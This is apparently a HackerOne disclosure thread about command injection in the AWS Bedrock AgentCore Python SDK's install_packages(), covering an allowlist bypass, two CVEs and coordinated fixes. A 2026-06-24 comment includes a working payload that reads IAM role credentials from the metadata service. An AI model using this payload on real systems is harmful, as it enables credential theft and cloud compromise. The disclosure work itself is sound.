---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/os-command-injection
  - env/cloud
  - stack/aws
substate: "resolved"
weakness: "OS Command Injection"
enriched: true
date: 2026-09-16
submitted: 2026-03-28T01:16:16.546Z
bounty_usd: null
votes: 24
cve: "CVE-2026-12530"
program: "[[programs/aws_vdp|AWS VDP]]"
reporter: "mistercloudsec"
source: "https://hackerone.com/reports/3633123"
title: " Incomplete Input Sanitization in CodeInterpreter install_packages Allows Command Injection via pip Flags"
---
#  Incomplete Input Sanitization in CodeInterpreter install_packages Allows Command Injection via pip Flags

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 24 | **Program:** AWS VDP | **Disclosed:** 2026-09-16

- Report: [https://hackerone.com/reports/3633123](https://hackerone.com/reports/3633123)
- CWE: OS Command Injection | CVE: CVE-2026-12530
- Submitted: 2026-03-28T01:16:16.546Z

## Timeline

- **Report Filed**
- **Report Needs More Info**
- **Report New**
- **Report Severity Updated**
- **Report Pending Program Review**
- **2026-04-23** @swagnerd: Hi @████████,

I hope you are having a great day! I’m happy to report that an allowlist-based input validation was deployed in SDK v1.6.1 [1] to address the injection vectors identified in the report.

When you have a moment, please feel free to re-test to confirm that we've addressed your concerns. 

With that, we'll be happy to collaborate with you during the publication process. When you're ready, please feel free to share a copy of your blog draft with us, and we'll be happy to review with the internal teams that worked on your report.

Thanks again for your continued collaboration!

[1] https://github.com/aws/bedrock-agentcore-sdk-python/pull/403
- **2026-04-23** @mistercloudsec: Hi @████████,

Thanks for the quick turnaround. I've re-tested v1.6.1 and confirm the allowlist blocks all three vectors from the report. Happy with the fix.

I'll share the blog draft before publishing.

One ask on disclosure: could AWS Security assign a CVE for this? The SDK is distributed via PyPI and every version through v1.6.0 is vulnerable and still installable, so downstream consumers need a clear signal to upgrade. Clean CWE mapping (CWE-77 / CWE-20), confirmed impact (arbitrary file read, SSRF to attacker-controlled PyPI, command execution), and a merged fix in PR #403, so the record would be straightforward.

Thanks again!
- **2026-05-21** @mistercloudsec: Hi @████████, 

Following up on this one. It's been about a month and we're planning to publish in roughly 2 weeks.

  1. Any update on CVE assignment? v1.6.0 and earlier are still installable from PyPI.
  2. How should I share the blog draft (covering #3633146 and #3633119 too) for review (HackerOne attachment, email or other)?

Thanks!
- **2026-05-21** @swagnerd: Hi @████████,

Our Amazon CNA program team is currently assessing this issue for potential CVE issuance. I will let you know as soon as that decision is finalized.

Thank you for sharing your intended publication date. I will work to ensure that any planned advisories are finalized prior to your planned publication date.

In the meantime, please feel free to share a copy of your blog draft on this thread as soon as your ready. We will review and share any potential technical feedback we may have.

Thank you again for your collaboration and support.
- **2026-05-28** @mistercloudsec: Hi @████████,

Attaching the blog draft as requested. It covers this report along with #3633146 (rogue CA via deploy-certificates.sh) and #3633119 (Jupyter kernel hijack), all part of the same Code Interpreter research.

The disclosure timeline at the end of this finding still has the CVE assessment as TBD. I'll update it once the Amazon CNA decision is finalized.

Happy to incorporate any technical feedback before publishing.

Thanks!
████████
- **2026-06-05** @swagnerd: Hi @████████,

Thank you so much for sharing your blog draft with us!  We're actively reviewing your draft and appreciate you sharing it with us ahead of publication.

On the CVE front, the Amazon CNA has completed their initial determination and is working to finalize the decision. I'll share that conclusion with you as soon as it's available.

Let me know if you have any questions in the meantime.
- **2026-06-19** @swagnerd: Hi @████████,

Thank you for your patience while we reviewed your blog draft. Please find our feedback attached below.

████████

Additionally, I'm happy to share that we have published the following advisories in coordination with this finding:

- AWS Security Bulletin: https://aws.amazon.com/security/security-bulletins/2026-044-aws/
- CVE: https://www.cve.org/cverecord?id=CVE-2026-12530
- GHSA: https://github.com/advisories/GHSA-6rfw-mq36-jm8h

Please let us know if you have any questions or concerns with our feedback. Additionally, will you please let us know your intended publication date as soon as you have that finalized? Thank you again for your collaboration throughout this process.

Best regards,
@████████
- **2026-06-22** @mistercloudsec: Hi @████████,

Thanks for the feedback on the draft, much appreciated. I'm working through it now and updating the blog accordingly; I'll share the revised draft and confirm a publication date once the edits are in.

Two small requests while we're finalizing CVE-2026-12530:

  1. GitHub advisory (https://github.com/advisories/GHSA-6rfw-mq36-jm8h): I'm credited by name in the description, but not in the structured Credits field that links a GitHub profile. Could the advisory maintainers add me there as the finder, GitHub handle  ████████? GitHub will send me a request to accept once I'm added.
  2. CVE record (https://www.cve.org/cverecord?id=CVE-2026-12530): the credit currently reads "BeyondTrust". Could it be updated to "████████", consistent with https://www.cve.org/cverecord?id=CVE-2026-11931 from #3630605?

Thanks again for the smooth coordination on this.
- **2026-06-24** @mistercloudsec: Hi @████████,

Important follow-up: **the v1.6.1 allowlist does not fully fix [CVE-2026-12530](https://www.cve.org/CVERecord?id=CVE-2026-12530).** It blocks the three vectors from my original report, but the same bug is still reachable through a new vector the allowlist does not cover, so `install_packages()` is exploitable again on every release up to v1.15.0.

The allowlist checks the package name, but `install_packages()` still drops it into a shell command. The regex allows a pip extras group `[...]` with any characters inside, so `pandas[$(...)]` passes validation and the `$(...)` runs in the shell.

This single validated call reads the execution role's credentials from MMDS and returns them through the command's own error output, with no network involved:

```python
client.install_packages(["pandas[$(T=$(curl -s -X PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 180'); curl -s -H \"X-aws-ec2-metadata-token: $T\" http://169.254.169.254/latest/meta-data/iam/security-credentials/execution_role | base64 | tr -d '\n')]"])
```

The credentials are base64'd into the package argument, so pip fails locally with `Invalid requirement: 'pandas[<base64 creds>]'` and echoes them back through stderr, the same error-output channel as the file read in my original report. I decoded the blob and confirmed the credentials are valid with `sts:GetCallerIdentity`.

**So [CVE-2026-12530](https://www.cve.org/CVERecord?id=CVE-2026-12530) is not fully remediated.** How would you like to handle the corrected fix, and does this update the existing CVE or need a new ID? Happy to share the full PoC. I'll hold the blog publication date until this is resolved.

Best,
@████████
- **2026-06-29** @mistercloudsec: Hi @████████ , were you able to validate this? Let me know how we should proceed since we need to know how to address it in our publication. I can also do a separate h1 report for this one if needed.

Also, I'm going to do a separate blog for this finding and another one for #3633146.

Thanks,
@████████
- **2026-06-29** @mistercloudsec: To summarize it, the fix for the CVE re-permits all five metacharacters the original blocklist rejected `(;, &, |, `, $)` as long as they sit inside `[...]`.
- **2026-06-30** @swagnerd: Hi @████████,

Thank you so much for sharing this additional information. I'm actively working with the internal team to review the details. Please give me a day or two to get back to you once I have more specific next steps to share. 

We really appreciate your thoroughness and collaboration throughout this process! I will be in touch soon!

Thanks again,
@████████
- **2026-07-07** @mistercloudsec: Thanks @████████! did you have any news from the internal team already?
- **2026-07-13** @mistercloudsec: Hi @████████, do you have any updates? we are planning on releasing the blog post next week, thanks
- **2026-07-17** @swagnerd: Hi @████████,

Thank you for your patience while our team investigated your follow-up details regarding CVE-2026-12530. We appreciate you giving us the time to properly assess this.

We've completed our internal analysis and can confirm that the concerns you raised are valid. The team has already developed a corrected fix with regression tests and is working to deploy it.

Additionally, we have engaged the Amazon CNA to assess whether a second CVE ID is warranted for this bypass. That process is now underway alongside the technical remediation.

We are prioritizing both of these processes, but wanted to ask if you would be willing to delay publication until the fix is fully deployed and any necessary customer advisories are published.

Thank you again for your collaboration and patience throughout this process, and for holding publication while we worked through the investigation. We'll keep you updated on our progress.

Best regards,
████████
- **2026-07-23** @swagnerd: Hi @████████,

I hope you're doing well! I'm happy to share that we released version 1.18.1 [1] of the bedrock-agentcore Python package, which addresses this issue. We recommend upgrading to the latest version and ensuring any forked or derivative code is patched to incorporate the new fixes.

Additionally, we are planning to publish a CVE, GHSA, and AWS Security Bulletin. That process is currently being finalized, and I will share the links as soon as the advisory links are live. I expect that to be complete within the next 24 hours. We will be sure to acknowledge your research organization and include your provided GitHub alias on the GHSA.

Please let me know if you have any questions or concerns. Thank you so much for your continued support and collaboration!

[1] https://pypi.org/project/bedrock-agentcore/1.18.1/
- **2026-07-23** @swagnerd: Hi @████████,

I happy to share that we have published an AWS Security Bulletin [1], CVE [2], and GHSA [3] to provide customer guidance for the Improper neutralization of argument delimiters in AWS Bedrock AgentCore Python SDK install_packages() issue you reported. 

Please let us know if you have any additional questions or concerns. Thank you again for your collaboration throughout this process, and for helping us keep our customers secure! 

[1] https://aws.amazon.com/security/security-bulletins/2026-065-aws/
[2] https://www.cve.org/cverecord?id=CVE-2026-16796
[3] https://github.com/aws/bedrock-agentcore-sdk-python/security/advisories/GHSA-j6g5-3hh3-pgw8
- **2026-07-24** @mistercloudsec: Hi @████████,

Re-tested v1.18.1 and the fix works, crafted names get rejected, `shlex.quote` handles the rest and normal packages install fine.

Thanks for sorting it out and for the GHSA credit! We're writing a blog on this, I'll send you the draft a few days before we publish so you can look it over.

Best regards,
@████████
- **2026-07-28** @swagnerd: Hi @████████,

Thank you for re-testing and confirming that the fix successfully addressed your concern. Please let us know when you're ready for us to review your blog draft. Thanks again!
- **2026-08-13** @mistercloudsec: Hi @████████ ! I'll send you the blog draft tomorrow, can I ask you for a public statement to include it in the blog? I would really appreciate it, thanks!
- **2026-08-17** @swagnerd: Hi @████████,

Sure thing, we'll get right to work on the public statement. Please send over your blog draft when you can so I can have a better idea of the scope of this publication. That will help us a lot on our end. Thanks again!
- **2026-08-27** @mistercloudsec: Hi @████████,

I'm attaching the blog draft ████████. Tt covers this report end to end: the newline injection (CVE-2026-12530), the extras bypass of the v1.6.1 allowlist (CVE-2026-16796) and the v1.18.1 fix, plus detection guidance for customers.

We are targeting Friday, September 4 for publication, so it would be great to have your review and the public statement before then. Both advisories have been public since June and July.

I will submit the disclosure request for this report on HackerOne once you have reviewed  the draft. The blog links it twice as the disclosure record, so it would help to have it approved before the 4th.

Thanks a lot again!
@████████
- **2026-09-03** @swagnerd: Hi ████████,

Thank you for sharing your blog draft with us and for your patience as we worked through our internal review.

We engaged the teams that investigated and fixed these issues to conduct a technical accuracy review. We have some feedback on the draft and have put together a document with our proposed changes. Please see the attached document.

The main theme of our feedback centers on component boundaries, specifically, ensuring the draft accurately identifies the affected component (the AgentCore Python SDK helper) and correctly scopes the impact and its preconditions.

If you have questions about the feedback or would like to discuss any of the proposed changes, the internal teams would welcome the opportunity to connect directly. Please let us know if a brief call would be helpful.

Thank you again for your collaboration throughout this process!
████████ ████████
- **2026-09-08** @mistercloudsec: Hi @████████,

Thanks a lot for the detailed review. We have applied everything in the document, the one thing we kept is "RCE" in the title, since it is the standard name for what both CVE records describe, "might allow a remote authenticated user to execute arbitrary commands within the Code Interpreter sandbox" (https://aws.amazon.com/security/security-bulletins/2026-065-aws/) and the draft now states all three preconditions explicitly. 

I am attaching the revised draft so you can review it again, it would be great to have the public statement you mentioned back too!
████████

Thanks again! @████████
- **2026-09-14** @mistercloudsec: Hi @████████,

Attaching the finalized draft ████████. Only change from the last version is the two sentences we agreed on: the intro and the first Key Findings bullet now name the AgentCore Python SDK as what the input got past.

Once you mark the report as resolved I'll submit the disclosure request so it's approved ahead of publication.

Thanks again! @████████
- **Report Resolved**
- **2026-09-16** @swagnerd: Hi ████████,

Thank you so much for your patience throughout this process. I'm happy to share that we have our finalized AWS public statement for you to include in your blog. 

===== Begin Public Statement =====
AWS investigated and resolved the reported concerns.

On April 10 and July 17, 2026, AWS released updates to the open-source Amazon Bedrock AgentCore SDK for Python (bedrock-agentcore) that strengthened input validation and command construction in the Code Interpreter client’s install_packages() method. Version 1.6.1 addressed CVE-2026-12530 [1], and version 1.18.1 addressed CVE-2026-16796 [2].

Customers should upgrade to the latest version and ensure any forked or derivative code incorporates these fixes. No further action is required for customers using version 1.18.1 or later.

We appreciate ████████ and ████████ for reporting these issues and collaborating with AWS.

  [1] https://aws.amazon.com/security/security-bulletins/2026-044-aws/

  [2] https://aws.amazon.com/security/security-bulletins/2026-065-aws/
====== End Public Statement ======

My last request is to please let us know when you have a confirmed publication date. Please don't hesitate to reach out with any questions or concerns. Thank you again for your professionalism and collaboration!
- **Agreed On Going Public**
- **Cve Id Added**
- **Report Severity Updated**
- **Agreed On Going Public**
- **Report Became Public**
